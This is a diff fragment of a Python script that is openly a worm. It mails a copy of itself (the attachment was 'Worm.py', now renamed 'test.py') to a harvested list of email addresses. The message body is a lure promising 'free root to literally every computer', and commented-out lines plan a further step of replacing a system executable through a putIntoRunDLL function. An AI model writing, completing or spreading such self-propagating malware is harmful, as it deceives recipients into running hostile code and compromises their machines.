@@ -54,8 +54,7 @@ def getEmail():
 # https://github.com/The-Intrigued-Engineer/python_emails/blob/main/with_attachments.py
 def sendEmail(usernames):
     name = os.getlogin()
-    path = ('/Users/' + name + '/Downloads')
-    os.chdir(path)
+    os.chdir('/Users/' + name + '/Downloads')
     email_list = usernames
     for person in email_list:
         # Make the body of the email
@@ -64,7 +63,7 @@ def sendEmail(usernames):
             It gives you free root to literally every computer to ever exist
             You should believe me because everything you read on the internet is true
             """
-
+#C:\Users\ryanc\Downloads
         # make a MIME object to define parts of the email
         msg = MIMEMultipart()
         msg['From'] = email_from
@@ -75,7 +74,7 @@ def sendEmail(usernames):
         msg.attach(MIMEText(body, 'plain'))
 
         # Define the file to attach
-        filename = "Worm.py"
+        filename = "test.py"
 
         # Open the file in python as a binary
         attachment = open(filename, 'rb')  # r for read and b for binary
@@ -108,8 +107,8 @@ def sendEmail(usernames):
     TIE_server.quit()
 
 
-#3rd step = replace a Deep Executable with this file.
-    # def putIntoRunDLL:
+# #3rd step = replace a Deep Executable with this file.
+    # # def putIntoRunDLL:
 
 lnewlist = getEmail()
 print(lnewlist)
